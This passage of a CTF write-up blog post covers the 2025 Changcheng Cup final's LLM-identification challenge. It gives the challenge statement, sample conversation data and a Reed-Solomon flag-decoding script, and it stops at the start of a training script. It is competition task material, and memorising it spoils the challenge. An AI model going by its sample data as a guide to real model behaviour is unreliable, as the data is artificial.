<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025长城杯决赛部分题目云复盘 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="虚拟身份辨识战题目详情你需要根据给定数据集，分析出新收集到的会话数据是来自于哪些大语言模型。 文件信息 bert-mini-model: 一个包含了 bert-mini 模型的文件夹，该模型参数量约为 11M。 dataset.json：从四个大语言模型（LLM）进行交互得来的数据集。其中 label 字段为该会话与哪个 LLM 进行交互，范围 0-3。示例数据  1234567891011121">
<meta property="og:type" content="article">
<meta property="og:title" content="2025长城杯决赛部分题目云复盘">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="虚拟身份辨识战题目详情你需要根据给定数据集，分析出新收集到的会话数据是来自于哪些大语言模型。 文件信息 bert-mini-model: 一个包含了 bert-mini 模型的文件夹，该模型参数量约为 11M。 dataset.json：从四个大语言模型（LLM）进行交互得来的数据集。其中 label 字段为该会话与哪个 LLM 进行交互，范围 0-3。示例数据  1234567891011121">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-06-26T14:35:47.000Z">
<meta property="article:modified_time" content="2025-07-01T10:17:32.183Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="AI">
<meta property="article:tag" content="python格式化字符串漏洞">
<meta property="article:tag" content="pickle反序列化">
<meta property="article:tag" content="RS256弱公钥jwt伪造">
<meta property="article:tag" content="nodejs弱比较">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "2025长城杯决赛部分题目云复盘",
  "url": "https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-06-26T14:35:47.000Z",
  "dateModified": "2025-07-01T10:17:32.183Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2025长城杯决赛部分题目云复盘',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">73</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">2025长城杯决赛部分题目云复盘</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2025长城杯决赛部分题目云复盘</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-26T14:35:47.000Z" title="发表于 2025-06-26 22:35:47">2025-06-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-01T10:17:32.183Z" title="更新于 2025-07-01 18:17:32">2025-07-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025%E7%BA%BF%E4%B8%8B%E8%B5%9B/">2025线下赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="虚拟身份辨识战"><a href="#虚拟身份辨识战" class="headerlink" title="虚拟身份辨识战"></a>虚拟身份辨识战</h2><h3 id="题目详情"><a href="#题目详情" class="headerlink" title="题目详情"></a>题目详情</h3><p>你需要根据给定数据集，分析出新收集到的会话数据是来自于哪些大语言模型。</p>
<h4 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h4><ul>
<li>bert-mini-model: 一个包含了 bert-mini 模型的文件夹，该模型参数量约为 11M。</li>
<li>dataset.json：从四个大语言模型（LLM）进行交互得来的数据集。其中 label 字段为该会话与哪个 LLM 进行交互，范围 0-3。<br>示例数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;conversation&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;role&quot;: &quot;user&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;1. Take the input list of unsorted integers from the user.&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;role&quot;: &quot;assistant&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;To take an input list of unsorted integers from the user, you can follow these steps in a Python script:\n\n1. Prompt the user to enter a list of numbers separated by spaces or commas.\n2. Read the input from the user.\n3. Split the input string into individual components.\n4. Convert these components into integers.\n5. Handle any potential errors that may occur during input and conversion (e.g., non-numeric input).\n\nHere&#x27;s a sample Python code to demonstrate this process:\n\n```python\n# Prompt the user to enter a list of integers\nuser_input = input(\&quot;Enter a list of integers, separated by spaces or commas: \&quot;)\n\n# Convert the input string into a list of strings split by spaces or commas\n# Also strip whitespace in case of input separated by both spaces and commas\nstr_numbers = user_input.replace(&#x27;,&#x27;, &#x27; &#x27;).split()\n\ntry:\n    # Convert the list of strings into a list of integers\n    int_numbers = [int(num) for num in str_numbers]\n    print(\&quot;You entered the following list of integers:\&quot;, int_numbers)\nexcept ValueError:\n    print(\&quot;Please enter valid integers only.\&quot;)\n\n```\n\nThis code snippet will prompt the user to enter a list of integers either separated by spaces or commas, and then it will output the list of integers. It includes a basic error handling for non-integer inputs by catching a `ValueError`. Adjust the input prompt and error handling to fit your specific use case as necessary.&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;label&quot;: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<ul>
<li>flag.json: 新收集得来的 LLM 会话数据。<br>示例数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;conversation&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;role&quot;: &quot;user&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;Continuation: What could be the probable outcome if someone fails to revise their model after the second experiment?\nGenerate according to: After an initial observations, the students believe they know how the strings are connected inside the Mystery Tube. After you perform a second \&quot;experiment\&quot;, their observations confuse them. They have to revise their model. Finally, your third \&quot;experiment\&quot; baffles them. Just how are the strings connected?\nAfter performing this demonstration, students BEG me to tell them the secret for months... a few will try for more than a year. Some have tried to steal the Mystery Tube... one actually succeeded. Some have built their own at home just so they can figure out how it works.\nThis is a fun demonstration and students will learn a lot about scientific investigation.&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;role&quot;: &quot;assistant&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;If someone fails to revise their model after the second experiment in the Mystery Tube demonstration, several probable outcomes could occur:\n\n1. Misconceptions:\n- They might hold onto incorrect assumptions about how the strings are connected\n- This could lead to persistent misunderstandings about the actual mechanism\n\n2. Limited Learning:\n- They would miss the crucial lesson about how scientific models need to be flexible and adaptable\n- The importance of revising hypotheses based on new evidence would be lost\n\n3. Frustration:\n- They might become increasingly frustrated when their original model fails to explain new observations\n- This could lead to disengagement from the learning process\n\n4. Missed Scientific Process:\n- They would fail to experience the authentic scientific process of model revision\n- The valuable lesson about how scientists must adjust their theories based on new data would be lost\n\n5. Incomplete Understanding:\n- Their understanding of the phenomenon would remain incomplete or incorrect\n- This could affect their ability to grasp similar concepts in future scientific investigations\n\nThe key learning opportunity in this demonstration lies in the process of revising one&#x27;s thinking based on new evidence, so failing to do so would significantly diminish the educational value of the experience.&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<ul>
<li>flag_process.py: LLM 预测标签解码 flag 的辅助代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> reedsolo <span class="keyword">import</span> RSCodec</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">FLAG_TOTAL_LENGTH = <span class="number">32</span></span><br><span class="line">FLAG_PART_LENGTH = <span class="number">8</span></span><br><span class="line"><span class="keyword">assert</span> FLAG_TOTAL_LENGTH % FLAG_PART_LENGTH == <span class="number">0</span></span><br><span class="line">NSYM = math.ceil(FLAG_TOTAL_LENGTH * <span class="number">0.4</span> * <span class="number">2</span>)  <span class="comment"># 计算 Reed-Solomon 纠错码长度</span></span><br><span class="line">PERCENT_TO_CORRUPT = <span class="number">0.1</span>  <span class="comment"># 损坏比例 (10%)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_flag</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    编码器函数，根据传入的 flag 设置冗余数据。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    rs = RSCodec(NSYM)  <span class="comment"># 创建 Reed-Solomon 编码器</span></span><br><span class="line">    encoded_message = rs.encode(message)  <span class="comment"># 添加纠错码</span></span><br><span class="line">    <span class="keyword">return</span> encoded_message</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_flag</span>(<span class="params">encoded_message</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解码器函数，尝试解码和恢复原始消息。</span></span><br><span class="line"><span class="string">    使用固定的冗余设置 NSYM 字节。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    rs = RSCodec(NSYM)  <span class="comment"># 创建 Reed-Solomon 解码器</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_message, _, _ = rs.decode(encoded_message)  <span class="comment"># 尝试解码和纠错</span></span><br><span class="line">        <span class="keyword">return</span> decoded_message</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to decode message:&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 0-3 的数字数组转换为 bytes</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_to_bytes</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="comment"># 将 0-3 的数字数组转换为字节序列，每个数字用 2 位表示，4 个数字组成 1 字节</span></span><br><span class="line">    bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">        cur_bin = <span class="built_in">format</span>(num, <span class="string">&#x27;02b&#x27;</span>)  <span class="comment"># 将 0-3 的数字转为 2 位二进制</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(cur_bin) == <span class="number">2</span></span><br><span class="line">        bit_string += cur_bin</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(bit_string) % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    byte_array = <span class="built_in">int</span>(bit_string, <span class="number">2</span>).to_bytes(<span class="built_in">len</span>(bit_string) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> byte_array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 bytes 解码为 0-3 的数字数组</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_from_bytes</span>(<span class="params">byte_array</span>):</span><br><span class="line">    <span class="comment"># 将字节序列转换回 0-3 的数字数组，每个字节拆分为 4 个数字</span></span><br><span class="line">    bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(byte_array)):</span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt;= byte_array[i] &lt;= <span class="number">255</span></span><br><span class="line">        byte_bin = <span class="built_in">bin</span>(byte_array[i])[<span class="number">2</span>:].zfill(<span class="number">8</span>)  <span class="comment"># 字节转 8 位二进制</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(byte_bin) == <span class="number">8</span></span><br><span class="line">        bit_string += byte_bin</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 每 2 位切一段，转换回 0-3 的数字</span></span><br><span class="line">    numbers = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bit_string), <span class="number">2</span>):</span><br><span class="line">        num = <span class="built_in">int</span>(bit_string[i:i+<span class="number">2</span>], <span class="number">2</span>)  <span class="comment"># 每两位解析为一个数字</span></span><br><span class="line">        numbers.append(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> numbers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成一个格式为 abcd-abcd-abcd-abcd 的 UUID，并使用 flag&#123;&#125; 包裹。</span></span><br><span class="line"><span class="string">    每个部分是 4 个随机小写字母。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    parts = [<span class="string">&quot;&quot;</span>.join(random.choices(string.ascii_lowercase, k=FLAG_PART_LENGTH)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(FLAG_TOTAL_LENGTH // FLAG_PART_LENGTH)]</span><br><span class="line">    flag = <span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span>.join(parts)&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flag.encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;====== <span class="subst">&#123;idx&#125;</span> ======&quot;</span>)</span><br><span class="line">        <span class="comment"># 生成一个 16 字节的 flag</span></span><br><span class="line">        flag = generate_random_flag()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Original message (<span class="subst">&#123;<span class="built_in">len</span>(flag)&#125;</span>):&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 编码：根据 flag 设置冗余数据</span></span><br><span class="line">        encoded_message = encode_flag(flag)  <span class="comment"># 添加纠错码</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Encoded message (<span class="subst">&#123;<span class="built_in">len</span>(encoded_message)&#125;</span>):&quot;</span>, encoded_message)  </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 编码为 bytes</span></span><br><span class="line">        labels = decode_from_bytes(encoded_message)  <span class="comment"># 转为数字数组</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Decoded labels (<span class="subst">&#123;<span class="built_in">len</span>(labels)&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 模拟 20% 比特损坏</span></span><br><span class="line">        num_labels = <span class="built_in">len</span>(labels)</span><br><span class="line">        num_labels_to_corrupt = math.ceil(num_labels * PERCENT_TO_CORRUPT)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建随机损坏区间</span></span><br><span class="line">        num_intervals = random.randint(<span class="number">1</span>, <span class="number">5</span>)  <span class="comment"># 随机选择 1 到 5 个区间</span></span><br><span class="line">        intervals = []</span><br><span class="line">        remaining_corruption = num_labels_to_corrupt</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_intervals):</span><br><span class="line">            <span class="keyword">if</span> remaining_corruption == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            start_index = random.randint(<span class="number">0</span>, num_labels - <span class="number">1</span>)</span><br><span class="line">            max_length = <span class="built_in">min</span>(remaining_corruption, num_labels - start_index)</span><br><span class="line">            interval_length = random.randint(<span class="number">1</span>, max_length)</span><br><span class="line">            end_index = start_index + interval_length</span><br><span class="line">            intervals.append((start_index, end_index))</span><br><span class="line">            remaining_corruption -= interval_length</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 应用损坏</span></span><br><span class="line">        <span class="keyword">for</span> start_index, end_index <span class="keyword">in</span> intervals:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_index, end_index):</span><br><span class="line">                labels[i] = random.randint(<span class="number">0</span>, <span class="number">3</span>)  <span class="comment"># 随机替换为 0-3</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解码：恢复原始消息</span></span><br><span class="line">        noisy_message = encode_to_bytes(labels)  <span class="comment"># 转回字节序列</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Noisy message (<span class="subst">&#123;<span class="built_in">len</span>(noisy_message)&#125;</span>):&quot;</span>, noisy_message)</span><br><span class="line">        decoded_flag = decode_flag(noisy_message)  <span class="comment"># 解码并纠错</span></span><br><span class="line">        <span class="keyword">assert</span> decoded_flag</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decoded (recovered) message:&quot;</span>, decoded_flag)</span><br><span class="line">        <span class="keyword">assert</span> flag == decoded_flag</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="更多信息"><a href="#更多信息" class="headerlink" title="更多信息"></a>更多信息</h4><p>你需要对 flag.json 中的每一个会话预测一个标签值，代表该会话来自于哪一个 LLM。标签范围与 dataset.json 中相同，为 0-3。<br>在预测出 N 个标签之后，请参照 flag_process.py 里的代码来将预测出来的多个标签解码为真正的 flag。</p>
<p>flag 的编码过程使用了冗余自纠正编码，因此预测准确率大于 95% 左右即可成功解密，准确率越高解密成功率越高。</p>
<h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><p>RTX 3090 * 1卡<br>PyTorch  2.5.1<br>Python  3.12(ubuntu22.04)<br>CUDA  12.4</p>
<p>pip install transformers<br>pip install reedsolo</p>
<h3 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h3><p>train.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 